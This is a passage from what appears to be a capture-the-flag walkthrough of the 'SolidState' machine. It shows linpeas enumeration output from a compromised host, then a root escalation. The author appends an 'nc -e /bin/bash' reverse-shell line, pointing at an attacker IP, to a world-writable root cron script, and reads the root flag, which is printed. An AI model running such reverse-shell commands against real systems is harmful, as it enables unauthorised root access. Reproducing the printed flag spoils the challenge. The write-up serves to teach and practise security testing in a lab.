-r--r--r-- 1 Debian-gdm Debian-gdm 11 Jul 25 03:34 /tmp/.X1024-lock
-rw-r--r-- 1 root root 559 Jun 18  2017 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 229 Jun 18  2017 /var/backups/dpkg.diversions.6.gz
-rw-r--r-- 1 root root 445607 Aug 22  2017 /var/backups/dpkg.status.4.gz
-rw-r--r-- 1 root root 102400 Aug 22  2017 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 229 Jun 18  2017 /var/backups/dpkg.diversions.4.gz
-rw-r--r-- 1 root root 229 Jun 18  2017 /var/backups/dpkg.diversions.2.gz
-rw-r--r-- 1 root root 9784 Nov 18  2020 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 1570205 May 27 11:06 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 445607 Aug 22  2017 /var/backups/dpkg.status.6.gz
-rw-r--r-- 1 root root 208 Jun 18  2017 /var/backups/dpkg.statoverride.3.gz
-rw-r--r-- 1 root root 448735 Nov 18  2020 /var/backups/dpkg.status.2.gz
-rw-r--r-- 1 root root 208 Jun 18  2017 /var/backups/dpkg.statoverride.5.gz
-rw-r--r-- 1 root root 229 Jun 18  2017 /var/backups/dpkg.diversions.5.gz
-rw-r--r-- 1 root root 208 Jun 18  2017 /var/backups/dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 9737 Aug 22  2017 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 445607 Aug 22  2017 /var/backups/dpkg.status.3.gz
-rw-r--r-- 1 root root 208 Jun 18  2017 /var/backups/dpkg.statoverride.6.gz
-rw-r--r-- 1 root root 297 Jun 18  2017 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 9701 Jun 18  2017 /var/backups/apt.extended_states.3.gz
-rw-r--r-- 1 root root 448068 May 27 11:06 /var/backups/dpkg.status.1.gz
-rw-r--r-- 1 root root 208 Jun 18  2017 /var/backups/dpkg.statoverride.4.gz
-rw-r--r-- 1 root root 229 Jun 18  2017 /var/backups/dpkg.diversions.3.gz
-rw-r--r-- 1 root root 85911 Apr 26  2021 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 208 Jun 18  2017 /var/backups/dpkg.statoverride.2.gz
-rw-r--r-- 1 root root 229 Jun 18  2017 /var/backups/dpkg.diversions.1.gz
-rw-r--r-- 1 root root 445607 Aug 22  2017 /var/backups/dpkg.status.5.gz

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                               
/dev/mqueue                                                                                                                                                                     
/dev/shm
/home/mindy
/opt/tmp.py
/run/lock
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/transient
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                               
                                                                                                                                                                                
╔══════════╣ Searching passwords in history files
                                                                                                                                                                                
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                       
/bin/systemd-tty-ask-password-agent
/etc/java-8-openjdk/management/jmxremote.password
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/usr/lib/evolution-data-server/credential-modules
/usr/lib/evolution-data-server/credential-modules/module-credentials-goa.so
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/i386-linux-gnu/libsamba-credentials.so.0
/usr/lib/i386-linux-gnu/libsamba-credentials.so.0.0.1
/usr/lib/i386-linux-gnu/samba/libcmdline-credentials.so.0
/usr/lib/jvm/java-8-openjdk-i386/jre/lib/management/jmxremote.password
/usr/lib/libreoffice/program/libpasswordcontainerlo.so
/usr/lib/libreoffice/share/config/soffice.cfg/cui/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/dbaccess/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/modules/scalc/ui/retypepassworddialog.ui
/usr/lib/libreoffice/share/config/soffice.cfg/sfx/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/masterpassworddlg.ui
/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/password.ui
/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/setmasterpassworddlg.ui
/usr/lib/libreoffice/share/config/soffice.cfg/vcl/ui/cupspassworddialog.ui
/usr/lib/pppd/2.4.7/passwordfd.so
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/doc/p7zip/DOC/MANUAL/cmdline/switches/password.htm
/usr/share/help/as/gnome-help/user-changepassword.page
/usr/share/help/as/gnome-help/user-goodpassword.page
/usr/share/help/bg/evince/password.page
/usr/share/help/bg/zenity/figures/zenity-password-screenshot.png
/usr/share/help/bg/zenity/password.page
/usr/share/help/ca/evince/password.page
/usr/share/help/ca/file-roller/password-protection.page
/usr/share/help/ca/file-roller/troubleshooting-password.page
/usr/share/help/ca/gnome-help/user-changepassword.page
/usr/share/help/ca/gnome-help/user-goodpassword.page
/usr/share/help/ca/zenity/figures/zenity-password-screenshot.png
/usr/share/help/ca/zenity/password.page
/usr/share/help/C/evince/password.page
/usr/share/help/C/file-roller/password-protection.page
/usr/share/help/C/file-roller/troubleshooting-password.page
/usr/share/help/C/gnome-help/user-changepassword.page
/usr/share/help/C/gnome-help/user-goodpassword.page
/usr/share/help/C/seahorse/keyring-update-password.page
/usr/share/help/C/seahorse/passwords-stored-create.page
/usr/share/help/C/seahorse/passwords-view.page
/usr/share/help/cs/evince/password.page
/usr/share/help/cs/file-roller/password-protection.page
/usr/share/help/cs/file-roller/troubleshooting-password.page
/usr/share/help/cs/gnome-help/user-changepassword.page
/usr/share/help/cs/gnome-help/user-goodpassword.page
/usr/share/help/cs/seahorse/keyring-update-password.page
/usr/share/help/cs/seahorse/passwords-stored-create.page
/usr/share/help/cs/seahorse/passwords-view.page
/usr/share/help/cs/zenity/figures/zenity-password-screenshot.png
/usr/share/help/cs/zenity/password.page
/usr/share/help/C/zenity/figures/zenity-password-screenshot.png
/usr/share/help/C/zenity/password.page
/usr/share/help/da/evince/password.page

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                
╔══════════╣ Searching passwords inside logs (limit 70)
Description: Set up users and passwords                                                                                                                                         



${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ 
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ 
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ 
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls /opt -1l                                                                                                            
total 8                                                                                                                                                                         
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2                                                                                                                           
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cat tmp.py
cat: tmp.py: No such file or directory
${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

```

### end of output

we will get lots of output with RED/YELLOW 95% a PE vector:

```
Vulnerable to CVE-2021-4034                                                                                                                                                     
```
![[SolidState-15.png]]

but we could find more information, let's check its folder contents.

![[SolidState-16.png]]

```txt
╔══════════╣ Unexpected in /opt (usually empty)
total 16                                                                                                                                                                        
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27 11:05 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
```

```bash
# check the privilege and content
ls /opt -1l
cat /opt/tmp.py
```

![[SolidState-17.png]]

sure, we have rwx privilege on this tmp.py and this script was create by root.

```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

![[SolidState-18.png]]
we will find ther are os.system('rm -r /tmp/* '), so we will change this command to create a reverse shell command.

```bash
# lhost
nc -vlp 3333
# rhost
cd /opt
echo "os.system('/bin/nc -e /bin/bash 10.10.14.10 3333')" >> tmp.py
```

Since it is a crontab job. Wait minute we will get the reverse shell connect, and type the root flag

```bash
id
cat /root/root.txt
# flag
7c8152111f89132f583131443f6f6572
```

![[SolidState-19.png]]
